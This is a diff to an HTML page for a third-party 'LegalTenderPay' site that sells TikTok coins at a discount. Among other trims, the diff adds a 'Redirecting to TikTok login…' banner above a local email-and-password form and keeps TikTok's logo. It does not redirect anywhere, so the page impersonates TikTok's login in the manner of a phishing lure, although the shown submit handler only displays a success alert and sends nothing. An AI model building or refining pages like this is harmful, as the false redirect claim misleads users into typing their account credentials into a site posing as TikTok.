@@ -205,18 +205,6 @@ body {
   transform: scale(1.05);
 }
 
-/* TikTok logo centered */
-.tiktok-logo-section {
-  text-align: center;
-  margin-top: 10px;
-  opacity: 0.3;
-}
-
-.tiktok-logo-section img {
-  width: 60px;
-  height: auto;
-}
-
 /* Footer */
 .footer {
   text-align: center;
@@ -250,31 +238,42 @@ body {
   opacity: 0.9;
 }
 
-/* Full-page login */
+/* FULL PAGE LOGIN */
 #loginPage {
   display: none;
   height: 100vh;
   width: 100%;
-  background: #fff;
+  background: linear-gradient(145deg, #fff, #f9e0e6, #fde9ef);
   display: flex;
-  flex-direction: column;
   align-items: center;
   justify-content: center;
+  flex-direction: column;
 }
 
-.login-form {
+.redirect-text {
+  color: #ff375f;
+  font-weight: 600;
+  margin-bottom: 20px;
+  font-size: 16px;
+}
+
+.login-box {
+  background: white;
+  padding: 25px 20px;
+  border-radius: 16px;
   width: 90%;
   max-width: 350px;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
   text-align: center;
 }
 
-.login-form h2 {
+.login-box h2 {
   color: #ff375f;
-  font-size: 28px;
+  font-size: 26px;
   margin-bottom: 20px;
 }
 
-.login-form input {
+.login-box input {
   width: 100%;
   padding: 12px;
   margin-bottom: 12px;
@@ -283,7 +282,7 @@ body {
   font-size: 15px;
 }
 
-.login-form button {
+.login-box button {
   background: #ff375f;
   color: white;
   border: none;
@@ -332,24 +331,12 @@ body {
   from { transform: translateY(0); opacity: 0.7; }
   to { transform: translateY(-10px); opacity: 1; }
 }
-
-/* Selected info after login */
-.selected-info {
-  text-align: center;
-  font-size: 17px;
-  font-weight: 600;
-  color: #333;
-  background: #f8f8f8;
-  padding: 12px;
-  border-radius: 8px;
-  margin-top: 10px;
-}
 </style>
 </head>
 
 <body>
 
-<!-- Loader Animation -->
+<!-- Loader -->
 <div id="loader">
   <div class="loader-dots">
     <div></div><div></div><div></div>
@@ -364,7 +351,7 @@ body {
     <div class="header">
       <h1>Get Coins</h1>
       <div class="header-right">
-        <img class="tiktok-mini-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+        <img class="tiktok-mini-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg">
       </div>
     </div>
 
@@ -372,7 +359,6 @@ body {
       Save around <span>25%</span> with a lower<br> third-party service fee.
     </p>
 
-    <!-- COINS -->
     <div class="coins-grid" id="coinGrid">
       <div class="coin-box" onclick="selectBox(this)">
         <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 30</div>
@@ -386,57 +372,16 @@ body {
         <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 700</div>
         <div class="coin-price">NGN12,400</div>
       </div>
-      <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 1,400</div>
-        <div class="coin-price">NGN24,700</div>
-      </div>
-      <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 3,500</div>
-        <div class="coin-price">NGN61,600</div>
-      </div>
-
-      <!-- ✅ Custom coin option -->
-      <div class="coin-box" onclick="activateCustomBox(this)">
-        <span class="coin-amount">Custom</span>
-        <div id="customInputContainer" style="display:none; margin-top:6px;">
-          <input id="customInput" type="number" min="1" placeholder="Enter amount"
-          style="width:90%; padding:5px; font-size:14px; border-radius:6px; border:1px solid #ccc;">
-        </div>
-      </div>
     </div>
-
-    <div id="selectedInfo" class="selected-info" style="display:none;"></div>
 
     <button class="login-btn" onclick="openLogin()">Log in to get Coins</button>
-
-    <div class="invite-box">
-      <div class="invite-left">
-        <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
-        <div>
-          <div class="invite-text">Invite & Get Rewards</div>
-          <div class="invite-sub">Check out this new feature!</div>
-        </div>
-      </div>
-      <span class="share-btn" onclick="doShare()">&#62;</span>
-    </div>
-
-    <div class="coin-image-section">
-      <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
-    </div>
-
-    <div class="tiktok-logo-section">
-      <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-    </div>
-
-    <div class="footer">
-      <div class="legal">LegalTenderPay</div>
-    </div>
   </div>
 </div>
 
-<!-- Full Page Login -->
+<!-- FULL PAGE LOGIN -->
 <div id="loginPage">
-  <div class="login-form">
+  <div class="redirect-text">Redirecting to TikTok login…</div>
+  <div class="login-box">
     <h2>Log in</h2>
     <form onsubmit="handleLoginSubmit(event)">
       <input type="text" placeholder="Email or Username" required><br>
@@ -446,33 +391,13 @@ body {
   </div>
 </div>
 
-<div class="copy-popup" id="copyPopup">Link copied! Share it manually 💬</div>
-
 <script>
 let selectedCoin = null;
 
 function selectBox(element) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   element.classList.add('active');
-  selectedCoin = element.querySelector('.coin-amount') ? element.querySelector('.coin-amount').innerText : "Custom amount";
-}
-
-function activateCustomBox(element) {
-  // Deselect others
-  document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
-  element.classList.add('active');
-
-  // Show input
-  const inputContainer = element.querySelector('#customInputContainer');
-  inputContainer.style.display = 'block';
-
-  const input = element.querySelector('#customInput');
-  input.focus();
-
-  // Track the value dynamically
-  input.addEventListener('input', function() {
-    selectedCoin = input.value ? `${input.value} (Custom)` : "Custom amount";
-  });
+  selectedCoin = element.querySelector('.coin-amount').innerText;
 }
 
 function openLogin() {
@@ -481,48 +406,14 @@ function openLogin() {
     return;
   }
   document.getElementById("mainPage").style.display = "none";
-  const loader = document.getElementById("loader");
-  loader.style.display = "flex";
-  setTimeout(() => {
-    loader.style.display = "none";
-    document.getElementById("loginPage").style.display = "flex";
-  }, 2000);
+  document.getElementById("loginPage").style.display = "flex";
 }
 
 function handleLoginSubmit(event) {
   event.preventDefault();
-  const loader = document.getElementById("loader");
+  alert("✅ Logged in successfully!");
   document.getElementById("loginPage").style.display = "none";
-  loader.style.display = "flex";
-  setTimeout(() => {
-    loader.style.display = "none";
-    document.getElementById("mainPage").style.display = "block";
-    const selectedInfo = document.getElementById("selectedInfo");
-    selectedInfo.innerHTML = `✅ You selected: <strong>${selectedCoin}</strong>`;
-    selectedInfo.style.display = "block";
-    alert("✅ Logged in successfully!");
-  }, 2000);
-}
-
-function doShare() {
-  const shareData = {
-    title: "LegalTenderPay 🏆",
-    text: "Buy TikTok & Crypto coins securely and earn rewards 💰",
-    url: window.location.href
-  };
-  if (navigator.share) {
-    navigator.share(shareData).catch(err => console.log('❌ Share failed:', err));
-  } else {
-    const tempInput = document.createElement("input");
-    tempInput.value = shareData.url;
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempInput);
-    const popup = document.getElementById("copyPopup");
-    popup.classList.add("show");
-    setTimeout(() => popup.classList.remove("show"), 2500);
-  }
+  document.getElementById("mainPage").style.display = "block";
 }
 </script>
 
